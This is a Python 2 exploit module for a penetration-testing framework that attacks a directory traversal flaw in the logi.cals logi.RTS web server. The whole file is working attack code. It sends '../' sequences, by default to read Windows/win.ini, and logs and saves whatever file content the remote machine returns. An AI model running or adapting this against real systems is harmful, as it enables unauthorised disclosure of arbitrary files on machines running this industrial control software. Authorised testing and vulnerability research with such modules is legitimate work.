#!/usr/bin/env python
import urllib2
import base64
from collections import OrderedDict


from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_logi_cals_logi_RTS_dir_trav"
INFO['DESCRIPTION'] = "logi.cals logi.RTS Directory Traversal"
INFO['VENDOR'] = "https://www.logicals.com/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    Vulnerability exists in webserver. Remote attacker can disclose arbitrary file on remote machine using "../" combination.
Tested against logi.RTS RTShttpd.exe on Windows 7 x64 SP1.
"""
INFO["DOWNLOAD_LINK"] = "https://www.logicals.com/en/support/downloads"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "30 Mar, 2018"
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 80
OPTIONS["FILENAME"] = "../../../../../../Windows/win.ini"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.payload = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        self.filename = self.args.get("FILENAME", OPTIONS["FILENAME"])

    def make_url(self, path=''):
        url = 'http://{}:{}/'.format(self.host, self.port) + path
        return url

    def run(self):
        #Get options from gui
        self.args()
        url = self.make_url()
        self.log('[*] Trying to connect to {}'.format(url))
        urllib2.urlopen(url)
        self.log('[*] Trying to get content of {}'.format(self.filename))
        url = self.make_url(self.filename)
        data = urllib2.urlopen(url).read()
        if len(data) < 10000:
            self.log('[+]\r\n' + data)
        self.writefile(data)
        self.finish(True)



if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()